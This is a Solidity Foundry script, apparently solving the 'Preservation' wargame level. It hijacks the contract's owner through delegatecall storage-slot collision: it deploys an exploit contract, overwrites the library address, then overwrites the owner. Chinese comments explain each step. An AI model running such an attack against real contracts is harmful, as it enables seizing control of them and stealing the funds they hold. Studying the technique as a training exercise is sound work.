// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {PreservationExploit} from "../src/PreservationExploit.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function timeZone1Library() external view returns (address);
    function owner() external view returns (address);
}

contract PreservationAttackScript is Script {
    function run() external {
        address preservationLevel = 0xe29c900feEa50C68fA745680F87fEc12f21e4850;

        vm.startBroadcast();

        // 1) 部署攻击合约
        PreservationExploit exploit = new PreservationExploit();

        IPreservation target = IPreservation(preservationLevel);

        // 2) 第一次 setFirstTime: 把 timeZone1Library 改成攻击合约
        //    LibraryContract.setTime 写 slot 0 = Preservation.timeZone1Library
        target.setFirstTime(uint256(uint160(address(exploit))));

        // 3) 第二次 setFirstTime: 现在 delegatecall 跳到 PreservationExploit.setTime
        //    它会直接写 slot 2 = Preservation.owner
        target.setFirstTime(uint256(uint160(msg.sender)));

        vm.stopBroadcast();

        console.log("new owner:", target.owner());
    }
}
